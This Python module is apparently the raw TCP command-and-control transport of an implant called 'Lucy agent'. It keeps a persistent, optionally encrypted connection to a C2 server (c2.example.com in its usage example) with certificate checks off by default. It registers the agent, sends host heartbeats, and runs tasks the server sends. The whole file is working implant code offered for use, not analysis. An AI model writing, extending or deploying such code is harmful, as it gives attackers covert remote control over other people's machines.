"""
Raw TCP beacon transport for Lucy agent.

Implements a persistent TCP C2 channel with length-prefixed framing and
optional AES-256-GCM encryption (reusing the agent's crypto module).
Reconnection uses exponential backoff with jitter.

Uses only the Python standard library (socket, struct, ssl) plus the
agent's existing crypto module for encrypted frames.

os_compat = ["Windows", "Linux", "Darwin"]
dependencies = []
"""
import json
import logging
import random
import socket
import ssl
import struct
import threading
import time

logger = logging.getLogger("lucy_agent.tcp")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_HEADER_LEN = 4  # 4-byte big-endian length prefix
_MAX_FRAME = 16 * 1024 * 1024  # 16 MiB safety cap
_RECV_CHUNK = 65536

# Frame type flags (high bit of the 4-byte header)
#   bit 31 = encrypted
_FRAME_ENCRYPTED = 0x80000000
_FRAME_MASK = 0x7FFFFFFF


# ---------------------------------------------------------------------------
# TCP Beacon configuration
# ---------------------------------------------------------------------------


class TCPBeacon:
    """Raw TCP beacon configuration."""

    def __init__(
        self,
        host: str = "127.0.0.1",
        port: int = 8443,
        reconnect_interval: float = 5.0,
        jitter: float = 2.0,
        use_ssl: bool = False,
        ssl_verify: bool = False,
        aes_key: bytes | None = None,
    ) -> None:
        self.host = host
        self.port = port
        self.reconnect_interval = reconnect_interval
        self.jitter = jitter
        self.use_ssl = use_ssl
        self.ssl_verify = ssl_verify
        self.aes_key = aes_key  # 32-byte AES-256 key, or None for plaintext


# ---------------------------------------------------------------------------
# Connection
# ---------------------------------------------------------------------------


def connect(host: str, port: int, timeout: int = 30) -> socket.socket:
    """
    Connect to the TCP C2 server.

    Returns a connected socket (plain or SSL-wrapped depending on the
    global beacon config).  Raises RuntimeError on failure.
    """
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except Exception as exc:
        raise RuntimeError(f"TCP connect to {host}:{port} failed: {exc}") from exc

    logger.info("TCP connected to %s:%d", host, port)
    return sock


def wrap_ssl(sock: socket.socket, host: str, verify: bool = False) -> ssl.SSLSocket:
    """Wrap a plain socket with TLS.  *host* is used for SNI."""
    ctx = ssl.create_default_context()
    if not verify:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx.wrap_socket(sock, server_hostname=host)


# ---------------------------------------------------------------------------
# Framing — length-prefixed (4-byte big-endian length + payload)
# ---------------------------------------------------------------------------


def send_frame(sock: socket.socket, data: bytes, aes_key: bytes | None = None) -> bool:
    """
    Send a length-prefixed frame: 4-byte big-endian length + data.

    If *aes_key* is provided, the payload is AES-256-GCM encrypted and the
    encrypted flag is set in the header.

    Returns True on success, False on failure.
    """
    try:
        payload = data
        flags = 0

        if aes_key is not None:
            try:
                from core.crypto import encrypt as _aes_encrypt
                encrypted_b64 = _aes_encrypt(data, aes_key)
                payload = encrypted_b64.encode("utf-8")
                flags = _FRAME_ENCRYPTED
            except Exception as exc:
                logger.warning("AES encryption failed, sending plaintext: %s", exc)
                payload = data

        length = len(payload)
        if length > _MAX_FRAME:
            logger.error("Frame too large (%d > %d)", length, _MAX_FRAME)
            return False

        header = struct.pack("!I", length | flags)
        sock.sendall(header + payload)
        return True
    except Exception as exc:
        logger.warning("send_frame failed: %s", exc)
        return False


def recv_frame(sock: socket.socket, timeout: int = 30) -> bytes:
    """
    Receive a length-prefixed frame.

    Returns the decoded payload bytes, or b"" on failure / connection close.
    If the frame is encrypted (flag set) and an AES key is available via the
    crypto module's global state, it is decrypted transparently.
    """
    try:
        sock.settimeout(timeout)

        # Read 4-byte header
        header = _recv_exact(sock, _HEADER_LEN, timeout)
        if len(header) < _HEADER_LEN:
            return b""

        raw_len = struct.unpack("!I", header)[0]
        encrypted = bool(raw_len & _FRAME_ENCRYPTED)
        length = raw_len & _FRAME_MASK

        if length == 0:
            return b""
        if length > _MAX_FRAME:
            logger.error("Frame length too large (%d)", length)
            return b""

        payload = _recv_exact(sock, length, timeout)
        if len(payload) < length:
            return b""

        if encrypted:
            try:
                from core.crypto import decrypt as _aes_decrypt
                # The crypto module uses a global AES key set during handshake.
                # If a key is passed explicitly it would be used here; otherwise
                # we rely on the agent's global _aes_key.
                import agent as _agent_mod
                aes_key = getattr(_agent_mod, "_aes_key", b"")
                if aes_key:
                    return _aes_decrypt(payload.decode("utf-8"), aes_key)
            except Exception as exc:
                logger.warning("AES decryption failed: %s", exc)
                return b""

        return payload
    except socket.timeout:
        return b""
    except Exception as exc:
        logger.warning("recv_frame failed: %s", exc)
        return b""


def _recv_exact(sock: socket.socket, n: int, timeout: int = 30) -> bytes:
    """Read exactly *n* bytes from *sock*, or fewer on EOF/timeout."""
    buf = b""
    sock.settimeout(timeout)
    while len(buf) < n:
        try:
            chunk = sock.recv(min(n - len(buf), _RECV_CHUNK))
            if not chunk:
                break  # connection closed
            buf += chunk
        except socket.timeout:
            break
    return buf


# ---------------------------------------------------------------------------
# Beacon loop
# ---------------------------------------------------------------------------


class TCPBeaconLoop:
    """
    Raw TCP beacon loop with exponential backoff reconnection.

    Usage:
        loop = TCPBeaconLoop(host="c2.example.com", port=8443, use_ssl=True)
        loop.run(agent_id)
    """

    def __init__(
        self,
        host: str = "127.0.0.1",
        port: int = 8443,
        reconnect_interval: float = 5.0,
        jitter: float = 2.0,
        use_ssl: bool = False,
        ssl_verify: bool = False,
        poll_interval: float = 10.0,
        max_backoff: float = 300.0,
    ) -> None:
        self.beacon = TCPBeacon(
            host=host,
            port=port,
            reconnect_interval=reconnect_interval,
            jitter=jitter,
            use_ssl=use_ssl,
            ssl_verify=ssl_verify,
        )
        self.poll_interval = poll_interval
        self.max_backoff = max_backoff
        self._stop_event = threading.Event()
        self._sock: socket.socket | None = None

    def stop(self) -> None:
        self._stop_event.set()

    def _backoff(self, attempt: int) -> float:
        """Exponential backoff with jitter: base * 2^attempt + random jitter."""
        base = self.beacon.reconnect_interval
        delay = base * (2 ** min(attempt, 8))
        delay = min(delay, self.max_backoff)
        if self.beacon.jitter > 0:
            delay += random.uniform(0, self.beacon.jitter)
        return delay

    def _connect(self) -> socket.socket | None:
        """Establish a TCP connection (with optional TLS)."""
        try:
            sock = connect(self.beacon.host, self.beacon.port, timeout=30)
            if self.beacon.use_ssl:
                sock = wrap_ssl(sock, self.beacon.host, verify=self.beacon.ssl_verify)
            return sock
        except Exception as exc:
            logger.warning("TCP connect failed: %s", exc)
            return None

    def run(self, agent_id: str) -> None:
        """Main beacon loop with reconnection.  Blocks until stop() is called."""
        logger.info("Starting TCP beacon loop for agent %s -> %s:%d",
                     agent_id, self.beacon.host, self.beacon.port)
        attempt = 0

        while not self._stop_event.is_set():
            self._sock = self._connect()
            if self._sock is None:
                delay = self._backoff(attempt)
                logger.info("Reconnecting in %.1fs (attempt %d)", delay, attempt + 1)
                self._stop_event.wait(timeout=delay)
                attempt += 1
                continue

            # Connection established — reset backoff
            attempt = 0

            try:
                self._loop(self._sock, agent_id)
            except Exception as exc:
                logger.warning("TCP loop error: %s", exc)
            finally:
                try:
                    self._sock.close()
                except Exception:
                    pass
                self._sock = None

            if not self._stop_event.is_set():
                delay = self._backoff(attempt)
                self._stop_event.wait(timeout=delay)
                attempt += 1

    def _loop(self, sock: socket.socket, agent_id: str) -> None:
        """Inner poll/execute/report loop over an established connection."""
        # Send initial registration
        reg = json.dumps({"type": "register", "agent_id": agent_id}).encode("utf-8")
        if not send_frame(sock, reg, aes_key=self.beacon.aes_key):
            return

        # Start a heartbeat thread
        hb_thread = threading.Thread(
            target=self._heartbeat_loop,
            args=(sock, agent_id),
            daemon=True,
        )
        hb_thread.start()

        # Main receive loop
        while not self._stop_event.is_set():
            raw = recv_frame(sock, timeout=60)
            if not raw:
                logger.info("TCP connection closed by server.")
                return

            try:
                msg = json.loads(raw.decode("utf-8"))
            except (json.JSONDecodeError, UnicodeDecodeError) as exc:
                logger.warning("TCP message decode error: %s", exc)
                continue

            msg_type = msg.get("type")
            if msg_type == "task":
                result = self._execute_task(msg.get("payload", {}))
                result_bytes = json.dumps({
                    "type": "result",
                    "task_id": result.get("task_id", ""),
                    "payload": result,
                }).encode("utf-8")
                if not send_frame(sock, result_bytes, aes_key=self.beacon.aes_key):
                    return
            elif msg_type == "ping":
                send_frame(sock, json.dumps({"type": "pong"}).encode("utf-8"),
                           aes_key=self.beacon.aes_key)
            elif msg_type == "noop":
                pass

    def _heartbeat_loop(self, sock: socket.socket, agent_id: str) -> None:
        """Background heartbeat sender."""
        while not self._stop_event.is_set():
            self._stop_event.wait(timeout=self.poll_interval)
            if self._stop_event.is_set():
                break
            try:
                import psutil
                cpu = psutil.cpu_percent(interval=0.1)
                ram = psutil.virtual_memory().available
            except ImportError:
                cpu = 0.0
                ram = 0

            hb = json.dumps({
                "type": "heartbeat",
                "agent_id": agent_id,
                "payload": {"cpu": cpu, "ram_available": ram, "status": "online"},
            }).encode("utf-8")
            if not send_frame(sock, hb, aes_key=self.beacon.aes_key):
                break

    def _execute_task(self, task: dict) -> dict:
        """Delegate task execution to the agent's execute_task if available."""
        try:
            import agent as _agent_mod
            execute = getattr(_agent_mod, "execute_task", None)
            if callable(execute):
                return execute(task)
        except Exception:
            pass
        return {
            "task_id": task.get("task_id", ""),
            "status": "failed",
            "error": "No task executor available",
            "data": None,
        }
